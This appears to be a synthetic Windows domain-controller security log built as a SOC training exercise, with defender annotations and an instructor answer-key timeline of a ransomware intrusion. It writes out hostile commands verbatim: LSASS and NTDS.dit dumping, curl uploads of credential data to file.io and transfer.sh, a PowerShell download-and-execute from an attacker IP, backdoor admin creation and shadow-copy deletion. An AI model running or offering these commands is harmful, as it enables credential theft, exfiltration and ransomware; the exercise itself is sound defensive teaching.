@@ -1,0 +1,452 @@
+================================================================================
+WINDOWS SECURITY EVENT LOG — EXPORT
+Host: CORP-DC01 | Domain: MERIDIAN-CAPITAL.LOCAL
+Export Range: 2025-05-14 07:00:00 — 2025-05-14 23:59:59
+Total Events: 847 | Filtered Export: 94 events
+Generated: Security Operations Centre — Tier 1 Review
+================================================================================
+
+--- 07:14:22 --- EventID: 4624 | Logon Type 2 | SUCCESS
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.45 | Workstation: CORP-WS-045
+Auth: Kerberos | Session: 0x7A3F21
+
+--- 07:22:11 --- EventID: 4624 | Logon Type 2 | SUCCESS
+User: kpatel | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.67 | Workstation: CORP-WS-067
+Auth: Kerberos | Session: 0x7A3F89
+
+--- 07:31:05 --- EventID: 4624 | Logon Type 2 | SUCCESS
+User: amorris | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.22 | Workstation: CORP-WS-022
+Auth: Kerberos | Session: 0x7A4012
+
+--- 08:03:44 --- EventID: 4625 | Logon Type 3 | FAILED
+User: administrator | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:03:46 --- EventID: 4625 | Logon Type 3 | FAILED
+User: administrator | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:03:49 --- EventID: 4625 | Logon Type 3 | FAILED
+User: administrator | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:03:51 --- EventID: 4625 | Logon Type 3 | FAILED
+User: admin | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006D
+
+--- 08:03:53 --- EventID: 4625 | Logon Type 3 | FAILED
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:03:55 --- EventID: 4625 | Logon Type 3 | FAILED
+User: svc_sql | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:03:58 --- EventID: 4625 | Logon Type 3 | FAILED
+User: helpdesk | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:01 --- EventID: 4625 | Logon Type 3 | FAILED
+User: helpdesk1 | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:04 --- EventID: 4625 | Logon Type 3 | FAILED
+User: helpdesk.admin | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:07 --- EventID: 4625 | Logon Type 3 | FAILED
+User: it.admin | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:09 --- EventID: 4625 | Logon Type 3 | FAILED
+User: it.support | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:12 --- EventID: 4625 | Logon Type 3 | FAILED
+User: j.smith | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:15 --- EventID: 4625 | Logon Type 3 | FAILED
+User: john.smith | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:18 --- EventID: 4625 | Logon Type 3 | FAILED
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Failure Reason: Unknown username or bad password
+Sub Status: 0xC000006A
+
+--- 08:04:21 --- EventID: 4624 | Logon Type 3 | SUCCESS
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: —
+Auth: NTLM | Session: 0x8B2144
+[NOTE: External IP. NTLM auth against domain. Password spray success.]
+
+--- 08:06:33 --- EventID: 4648 | Explicit Credentials Logon
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Target User: svc_backup | Target Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47
+[NOTE: Immediate credential use after compromise — accessing service account]
+
+--- 08:07:14 --- EventID: 4672 | Special Privileges Assigned
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Privileges: SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege
+Session: 0x8B2199
+[NOTE: Service account has SeDebugPrivilege — can read LSASS memory]
+
+--- 08:09:02 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\Temp\svch0st.exe
+Command Line: svch0st.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+Parent Process: cmd.exe
+[NOTE: Mimikatz-style LSASS dump. Filename masquerading as svchost.]
+
+--- 08:09:04 --- EventID: 4656 | Object Access Attempt
+Object: \Device\HarddiskVolume3\Windows\System32\lsass.exe
+Process: C:\Windows\Temp\svch0st.exe
+Access: READ_PROCESS_MEMORY
+User: svc_backup
+
+--- 08:11:47 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\cmd.exe
+Command Line: cmd.exe /c whoami /all > C:\Windows\Temp\out.txt
+Parent Process: svch0st.exe
+
+--- 08:12:03 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\net.exe
+Command Line: net group "Domain Admins" /domain
+Parent Process: cmd.exe
+[NOTE: Domain admin enumeration]
+
+--- 08:12:08 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\net.exe
+Command Line: net user /domain
+Parent Process: cmd.exe
+
+--- 08:12:14 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\nltest.exe
+Command Line: nltest /domain_trusts
+Parent Process: cmd.exe
+[NOTE: Trust enumeration — looking for other domains to pivot to]
+
+--- 08:14:22 --- EventID: 4624 | Logon Type 3 | SUCCESS
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.200 | Workstation: CORP-FS01
+Auth: NTLM | Session: 0x8B3001
+[NOTE: Lateral movement — service account now authenticating to file server]
+
+--- 08:15:01 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \2025\Q1_Financial_Results.xlsx
+Source IP: 185.220.101.47
+
+--- 08:15:03 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \2025\Q2_Forecast_CONFIDENTIAL.xlsx
+Source IP: 185.220.101.47
+
+--- 08:15:06 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \MergerDocs\Acquisition_Target_NDA.pdf
+Source IP: 185.220.101.47
+
+--- 08:15:08 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \MergerDocs\ProjectFalcon_TermSheet_DRAFT.pdf
+Source IP: 185.220.101.47
+
+--- 08:15:11 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \MergerDocs\BoardPack_May2025_RESTRICTED.pdf
+Source IP: 185.220.101.47
+
+--- 08:15:14 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\HR$
+Access: READ | Object: \Employee_Records\AllStaff_Salaries_2025.xlsx
+Source IP: 185.220.101.47
+
+--- 08:15:17 --- EventID: 5145 | Network Share Access
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\HR$
+Access: READ | Object: \Employee_Records\Executive_Contracts_2025.pdf
+Source IP: 185.220.101.47
+
+--- 08:17:44 --- EventID: 4624 | Logon Type 3 | SUCCESS
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.2.15 | Workstation: CORP-DC01
+Auth: NTLM | Session: 0x8B4500
+[NOTE: CRITICAL — service account now authenticated to domain controller]
+
+--- 08:18:02 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\ntdsutil.exe
+Command Line: ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q
+Parent Process: cmd.exe
+[NOTE: CRITICAL — NTDS.dit extraction. Full AD database dump including all password hashes.]
+
+--- 08:21:33 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\reg.exe
+Command Line: reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv
+Parent Process: cmd.exe
+[NOTE: SYSTEM hive saved — needed to decrypt NTDS.dit offline]
+
+--- 08:23:11 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\certutil.exe
+Command Line: certutil -encode C:\Windows\Temp\ntds_dump\Active Directory\ntds.dit C:\Windows\Temp\ntds.b64
+Parent Process: cmd.exe
+[NOTE: Base64 encoding NTDS.dit — staging for exfiltration via certutil LOLBin]
+
+--- 08:24:55 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\curl.exe
+Command Line: curl -X POST https://file.io/upload -F "file=@C:\Windows\Temp\ntds.b64" -H "Authorization: Bearer eyJh..."
+Parent Process: cmd.exe
+[NOTE: CRITICAL — NTDS.dit exfiltrated to file.io. External upload via curl.]
+
+--- 08:26:01 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\curl.exe
+Command Line: curl -X POST https://file.io/upload -F "file=@C:\Windows\Temp\SYSTEM.hiv"
+Parent Process: cmd.exe
+[NOTE: SYSTEM hive exfiltrated — attacker now has everything needed to crack all domain passwords offline]
+
+--- 08:27:33 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Command Line: powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAc...
+Parent Process: cmd.exe
+[NOTE: PowerShell encoded command — obfuscated payload execution. Base64 decodes to: Invoke-WebRequest to C2 infrastructure]
+
+--- 08:29:44 --- EventID: 7045 | Service Installed
+Service Name: WindowsUpdateHelperSvc
+Service Path: C:\Windows\System32\svchost.exe -k netsvcs -p -s WindowsUpdateHelper
+Service Type: Win32OwnProcess
+Start Type: Automatic
+Account: LocalSystem
+[NOTE: Persistence mechanism installed as fake Windows Update service]
+
+--- 08:31:02 --- EventID: 4698 | Scheduled Task Created
+Task Name: \Microsoft\Windows\WindowsUpdate\ScheduledUpdate
+Task Content: C:\Windows\Temp\update.exe /silent /q
+Trigger: Daily at 03:00
+User: SYSTEM
+[NOTE: Second persistence mechanism — scheduled task masquerading as Windows Update]
+
+--- 09:14:22 --- EventID: 4625 | Logon Type 3 | FAILED
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.45 | Workstation: CORP-WS-045
+Failure Reason: Account locked out
+Sub Status: 0xC0000234
+[NOTE: Real jsmith locked out — attacker's earlier brute force triggered lockout policy with delay]
+
+--- 09:15:03 --- EventID: 4740 | Account Lockout
+Account: jsmith | Domain: MERIDIAN-CAPITAL
+Locked By: CORP-DC01
+Caller: CORP-DC01
+
+--- 09:15:44 --- EventID: 4723 | Password Change Attempt
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Changed By: jsmith
+Result: FAILED — does not meet complexity requirements
+[NOTE: Real user jsmith noticing something wrong, trying to change password]
+
+--- 10:02:15 --- EventID: 4624 | Logon Type 10 | SUCCESS
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47
+Workstation: CORP-DC01 | Auth: NTLM | Session: 0x9C1200
+[NOTE: Remote interactive logon (RDP) from external IP to domain controller as service account]
+
+--- 10:04:33 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Command Line: powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47:8080/payload.ps1')"
+Parent Process: explorer.exe
+[NOTE: CRITICAL — remote PowerShell payload download and execute from attacker C2]
+
+--- 10:06:11 --- EventID: 4720 | User Account Created
+New Account: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Created By: svc_backup
+Full Name: Helpdesk Temporary Service
+Description: Temporary service account for helpdesk automation
+[NOTE: Attacker creating backdoor account under guise of legitimate service account]
+
+--- 10:06:14 --- EventID: 4728 | Member Added to Security Group
+Group: Domain Admins | Domain: MERIDIAN-CAPITAL
+Member: svc_helpdesk_temp
+Added By: svc_backup
+[NOTE: CRITICAL — backdoor account added to Domain Admins]
+
+--- 10:06:18 --- EventID: 4738 | User Account Changed
+Account: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Changed By: svc_backup
+Changed Attributes: Password Never Expires = TRUE, Account Cannot Be Locked = TRUE
+[NOTE: Hardening backdoor account — password never expires, cannot be locked out]
+
+--- 11:47:03 --- EventID: 4624 | Logon Type 3 | SUCCESS
+User: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Source IP: 193.32.162.88 | Workstation: —
+Auth: NTLM | Session: 0xAA3301
+[NOTE: Backdoor account used from second external IP — different C2 node]
+
+--- 11:49:22 --- EventID: 5145 | Network Share Access
+User: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Share: \\CORP-FS01\Finance$
+Access: READ | Object: \2025\ [BULK ACCESS — 847 files accessed in 4 minutes]
+Source IP: 193.32.162.88
+[NOTE: Large-scale data staging — bulk file access pattern consistent with exfiltration preparation]
+
+--- 11:53:44 --- EventID: 4688 | Process Created
+Creator: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\robocopy.exe
+Command Line: robocopy \\CORP-FS01\Finance$ C:\Windows\Temp\staging /E /COPYALL /LOG:C:\Windows\Temp\rc.log
+Parent Process: cmd.exe
+[NOTE: Robocopy staging entire Finance share to local temp directory]
+
+--- 12:04:17 --- EventID: 4688 | Process Created
+Creator: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\curl.exe
+Command Line: curl --upload-file C:\Windows\Temp\staging\Finance.zip https://transfer.sh/Finance_Q2.zip
+Parent Process: cmd.exe
+[NOTE: CRITICAL — bulk exfiltration of Finance share contents to transfer.sh]
+
+--- 14:22:08 --- EventID: 4625 | Logon Type 3 | FAILED
+User: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Source IP: 10.10.1.100 | Workstation: CORP-WS-100
+Failure Reason: Account does not exist
+[NOTE: IT staff noticing unknown account — beginning investigation]
+
+--- 14:23:55 --- EventID: 4725 | User Account Disabled
+Account: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Disabled By: kadmin | Domain: MERIDIAN-CAPITAL
+[NOTE: IT admin disabling suspicious account — first containment action]
+
+--- 14:24:03 --- EventID: 4726 | User Account Deleted
+Account: svc_helpdesk_temp | Domain: MERIDIAN-CAPITAL
+Deleted By: kadmin | Domain: MERIDIAN-CAPITAL
+[NOTE: Account deleted — but attacker still has svc_backup and persistence mechanisms]
+
+--- 14:31:17 --- EventID: 4624 | Logon Type 3 | SUCCESS
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Source IP: 185.220.101.47 | Workstation: CORP-DC01
+Auth: NTLM | Session: 0xBB4401
+[NOTE: Attacker still active via svc_backup — secondary account not found yet]
+
+--- 14:33:44 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\vssadmin.exe
+Command Line: vssadmin delete shadows /all /quiet
+Parent Process: cmd.exe
+[NOTE: CRITICAL — shadow copy deletion. Pre-ransomware deployment step. Removing recovery points.]
+
+--- 14:35:02 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\Temp\update.exe
+Command Line: update.exe /encrypt /key:RSA4096 /ext:.locked /skip:C:\Windows /skip:C:\Program Files
+Parent Process: WindowsUpdateHelperSvc
+[NOTE: CRITICAL — RANSOMWARE DEPLOYED. update.exe encrypting files. Excluding Windows/Program Files to maintain system stability during encryption.]
+
+--- 14:35:08 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\cmd.exe
+Command Line: cmd /c for /r C:\Users %f in (*.xlsx *.pdf *.docx *.pptx *.csv *.zip *.7z) do C:\Windows\Temp\update.exe "%f"
+Parent Process: update.exe
+
+--- 14:36:22 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\cmd.exe
+Command Line: cmd /c net share Finance$ /delete && net share HR$ /delete
+Parent Process: update.exe
+[NOTE: Deleting shares to prevent access during encryption]
+
+--- 14:38:55 --- EventID: 4688 | Process Created
+Creator: svc_backup | Domain: MERIDIAN-CAPITAL
+New Process: C:\Windows\System32\notepad.exe
+Command Line: notepad.exe C:\Users\Public\Desktop\README_YOUR_FILES_ARE_ENCRYPTED.txt
+Parent Process: update.exe
+[NOTE: Ransom note dropped to desktop]
+
+--- 14:39:01 --- EventID: 7036 | Service Control Manager
+Service: WindowsUpdateHelperSvc
+Status: Running → Stopped
+[NOTE: Ransomware service stopped after payload delivered — cleanup]
+
+--- 14:41:17 --- EventID: 4634 | Logoff
+User: svc_backup | Domain: MERIDIAN-CAPITAL
+Session: 0xBB4401
+[NOTE: Attacker disconnected after payload delivery]
+
+--- 23:14:55 --- EventID: 4625 | Logon Type 3 | FAILED
+User: jsmith | Domain: MERIDIAN-CAPITAL
+Source IP: 193.32.162.88 | Workstation: —
+Failure Reason: Account locked out
+Sub Status: 0xC0000234
+[NOTE: Attacker retrying jsmith from second C2 node — account still locked from morning]
+
+================================================================================
+END OF LOG EXPORT
+Total Events Shown: 94 | Filtered From: 847
+Host: CORP-DC01 | Domain: MERIDIAN-CAPITAL.LOCAL
+================================================================================
+
+ATTACK TIMELINE SUMMARY (INSTRUCTOR REFERENCE — DO NOT SHARE):
+08:03 — Password spray from 185.220.101.47 (Tor exit node)
+08:04 — jsmith credentials found valid
+08:06 — Pivoted to svc_backup via explicit credential use
+08:09 — LSASS dump via svch0st.exe (masquerading as svchost)
+08:12 — Domain enumeration (net, nltest)
+08:14 — Lateral movement to CORP-FS01 (file server)
+08:15 — Finance and HR data accessed including M&A documents
+08:17 — Lateral movement to CORP-DC01 (domain controller)
+08:18 — NTDS.dit extracted via ntdsutil
+08:24 — NTDS.dit + SYSTEM hive exfiltrated via curl to file.io
+08:27 — PowerShell C2 beacon established
+08:29 — Persistence: fake Windows Update service installed
+08:31 — Persistence: scheduled task installed
+10:06 — Backdoor domain admin account svc_helpdesk_temp created
+11:49 — Bulk Finance share exfiltration (847 files)
+14:23 — IT admin detects suspicious account, disables it
+14:31 — Attacker still active via svc_backup (second account not found)
+14:33 — Shadow copies deleted (pre-ransomware)
+14:35 — Ransomware deployed via WindowsUpdateHelperSvc
+14:41 — Attacker disconnects
